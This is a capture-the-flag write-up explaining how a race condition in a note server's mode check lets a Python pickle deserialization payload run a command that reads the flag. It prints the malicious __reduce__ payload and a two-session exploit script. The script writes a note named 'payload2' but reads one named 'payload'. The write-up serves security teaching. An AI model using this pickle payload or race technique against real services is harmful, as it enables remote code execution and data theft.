# Challenge `Pickles in a seri(al)ous race` Writeup

- Vulnerability: 
  - Time-of-check Time-of-use / Race condition and Remote Code Execution
- Where:
  - `check_mode` function and `pickle.dump` function
- Impact:
  - allows remote code execution in the server

## Analyzing the server

This challenge consists in accessing a file inside the server running the script.
The script allows users to create users and create or read files. 
An important concept is that files can be created in either CLASSY or FREE mode and can only be read in the same mode, otherwise the file is deleted.
The CLASSY mode uses `pickle` to serialize and deserialize the content of the files, while the FREE mode stores information using plain text. 
The `pickle` library is known to be vulnerable to remote code execution, [source](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). 

## Exploit

Since the `pickle.dump` function is exploitable, the first step is to create a malicious payload to steal the flag.
```python
class FlagGrabber:
    def __reduce__(self):
        cmd = ('cat /home/ctf/flag')
        return os.system, (cmd,)

pickled = pickle.dumps(FlagGrabber())
```
From the source cited above, we can see that the `__reduce__` function is called when the object is deserialized and leads to the execution of `cmd` in the server.  
The problem is that the script in `CLASSY_MODE` doesn't serialize the user input but the `Note` object
```python
note = pickle.loads(note_content)
print(note)
(...)
note = Note(note_name, note_content)
with open(note_path, 'wb') as f:
    pickle.dump(note, f)
```
Therefore, the payload must be written to the file using the `FREE_MODE`.
To be able to write with `FREE_MODE` and later read with `CLASSY_MODE`, it's necessary to exploit a race condition in the verification of the user mode choice.
```python
if not check_mode(FREE_MODE):
    reset(FREE_MODE)
```
First create two sessions (`free` and `classy`) with the same user.
Then, in the `free` session, enter the `FREE_MODE` and in the `classy` enter the `CLASSY_MODE`.
```python
classy.recvuntil(b'Username: ')
classy.send(b'diogo\n')

free.recvuntil(b'Username: ')
free.send(b'diogo\n')

classy.recvuntil(b'>>> ')
classy.send(b'0\n')

free.recvuntil(b'>>> ')
free.send(b'1\n')
```
Since the `check_mode` is verified at the beginning, it's now possible to write the payload to a `FREE_MODE` file and then read it with the `CLASSY_MODE` without it being erased.
```python
free.recvuntil(b'note_name: ')
free.send(b'payload2\n')
free.recvuntil(b'note_content: ')
free.sendline(pickled)
free.sendline()
sleep(1)

classy.send(b'0\n')
classy.recvuntil(b'note_name: ')
classy.send(b'payload\n')
print(classy.recvuntil(b'}').decode("UTF-8"))
```
The sleep is necessary to give the server time to create the file.
This outputs the flag `SSof{Pickles_RCE_Th1s_was_an_easy_race}`


## Implementation

These code snippets and full implementation can be found [here](pickles_in_a_seri(al)ous_race.py).
